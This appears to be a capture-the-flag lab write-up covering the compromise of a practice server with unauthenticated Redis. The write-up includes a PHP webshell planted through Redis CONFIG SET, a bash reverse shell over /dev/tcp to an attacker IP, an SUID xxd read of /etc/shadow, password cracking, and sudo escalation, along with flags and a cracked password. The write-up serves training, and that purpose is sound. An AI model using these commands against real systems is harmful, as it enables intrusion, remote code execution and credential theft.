
---
## Reconaissance

An initial scan revealed the following information abt running services on the target server.

```
nmap -n -Pn -sS -p- 10.114.135.184                         
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-01 17:00 CDT
Nmap scan report for 10.114.135.184
Host is up (0.016s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6379/tcp open  redis

Nmap done: 1 IP address (1 host up) scanned in 15.43 seconds
```

There seems to be Redis running on the server. Let's check if we can connect to the redis database anonymously.

Succesfully logged in, but it showed me the wrong version & I wasn't able to run any commands.

Queried information about the server.

```
redis-cli -h 10.114.135.184 INFO server
# Server
redis_version:6.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:5c906d046e45ec07
redis_mode:standalone
os:Linux 5.15.0-139-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:5.4.0
process_id:574
run_id:bc203da28d5119eec8ff363b2542997222c9be3b
tcp_port:6379
uptime_in_seconds:574
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:16065670
executable:/home/vianka/redis-stable/src/redis-server
config_file:/home/vianka/redis-stable/redis.conf
io_threads_active:0
```

Connected to the redis service anonymously.

```
redis-cli -h 10.114.135.184
```

## Initial Access

Checked if we have write permissions, by setting the default working directory to the web-root.

```
10.114.135.184:6379> config set dir /var/www/html
OK
```

it worked! Which means we have write access, let's add an webshell and view it in the browser to get RCE, since it will be saved in the webroot now.

```
10.114.135.184:6379> config set dbfilename webshell.php
OK
```

```
10.114.135.184:6379> set test "<?php system($_GET['cmd']); ?>"
OK
```

```
10.114.135.184:6379> save
OK
```

Started up listener on port 80.

```
nc -lvnp 80
```

Executed bash reverse shell script (url encoded) on webshell.

```
curl http://10.114.135.184/webshell.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.227.246%2F80%200%3E%261%27
```

Gained RCE as user "www-data".

```
nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.227.246] from (UNKNOWN) [10.114.135.184] 49454
bash: cannot set terminal process group (717): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-114-135-184:/var/www/html$
```

Retrieved user.txt in /home/vianka directory.

```
thm{red1s_rce_w1thout_credent1als}
```

## Privilege Escalation

```
find / -perm /4000 2>/dev/null
```

Enumerated SUID "xxd" binary. Navigated to gtfobins and analyzed PoC to privesc. It seems we are able to dump the /etc/shadow file locally.

```
LFILE=/etc/shadow
xxd "$LFILE" | xxd -r 
```

This displayed me the encoded password of user "vianka", but not of user root. I cracked it utilizing john the ripper on my local machine.

```
john vianka_hash --wordlist=/usr/share/wordlists/rockyou.txt
beautiful1
```

Logged into user "vianka".

```
su vianka
beautiful1
```

Checked user "vianka"'s sudo permissions and realised she has full permissions, logged in as user root.

```
vianka@ip-10-114-135-184:/tmp$ sudo -l
sudo -l
[sudo] password for vianka: beautiful1

Matching Defaults entries for vianka on ip-10-114-135-184:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vianka may run the following commands on ip-10-114-135-184:
    (ALL : ALL) ALL
```

Retrieved root.txt in /root directory.

```
thm{xxd_pr1v_escalat1on}
```
